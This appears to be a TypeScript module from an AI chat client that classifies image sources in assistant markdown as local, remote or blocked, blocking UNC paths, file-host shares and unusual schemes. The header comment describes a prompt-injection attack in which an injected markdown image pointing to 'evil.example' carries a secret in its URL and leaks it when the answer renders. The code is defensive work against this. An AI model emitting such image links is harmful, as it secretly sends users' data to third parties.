import { safeUrlTransform } from './fileLinks'

/**
 * Image sources in assistant markdown are untrusted: a prompt-injected
 * `![](https://evil.example/?q=<secret>)` would be fetched automatically the
 * moment the answer renders, leaking data without any click. Only sources that
 * never leave the machine are rendered as <img>; anything that would hit the
 * network is shown as a plain link the user must click deliberately.
 */
export type ImageSourceKind =
  | { kind: 'local'; src: string }
  | { kind: 'remote'; url: string; host: string }
  | { kind: 'blocked' }

const WINDOWS_ABS = /^[A-Za-z]:[\\/]/
const UNC_PATH = /^\\\\/

function toFileUrl(winPath: string): string {
  const normalized = winPath.replace(/\\/g, '/')
  return `file:///${encodeURI(normalized)}`
}

export function classifyImageSrc(rawSrc: string | null | undefined): ImageSourceKind {
  const src = (rawSrc ?? '').trim()
  if (!src) return { kind: 'blocked' }

  // UNC paths (\\server\share) reach the network via SMB — treat as remote-ish and block.
  if (UNC_PATH.test(src)) return { kind: 'blocked' }

  if (WINDOWS_ABS.test(src)) return { kind: 'local', src: toFileUrl(src) }

  // Protocol-relative URLs resolve to http(s) on the current origin's scheme.
  if (src.startsWith('//')) {
    return remoteOrBlocked(`https:${src}`)
  }

  const scheme = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(src)?.[1]?.toLowerCase()
  if (!scheme) {
    // Relative path: resolves against the app's own origin, never a third party.
    return { kind: 'local', src }
  }

  switch (scheme) {
    case 'data':
      return /^data:image\//i.test(src) ? { kind: 'local', src } : { kind: 'blocked' }
    case 'blob':
      return { kind: 'local', src }
    case 'file': {
      // file://host/share is a network share — only allow file:/// (no host) or file:/C:/
      if (/^file:\/\/[^/]/i.test(src)) return { kind: 'blocked' }
      return { kind: 'local', src }
    }
    case 'http':
    case 'https':
      return remoteOrBlocked(src)
    default:
      return { kind: 'blocked' }
  }
}

function remoteOrBlocked(url: string): ImageSourceKind {
  try {
    const parsed = new URL(url)
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return { kind: 'blocked' }
    return { kind: 'remote', url: parsed.href, host: parsed.host }
  } catch {
    return { kind: 'blocked' }
  }
}

/**
 * URL transform for ReactMarkdown: same rules as `safeUrlTransform`, except
 * that `data:image/*` is kept for <img src> so inline local images still show.
 */
export function markdownUrlTransform(
  url: string,
  key: string,
  node: { tagName?: string }
): string {
  if (key === 'src' && node.tagName === 'img' && /^\s*data:image\//i.test(url)) {
    return url.trim()
  }
  return safeUrlTransform(url)
}
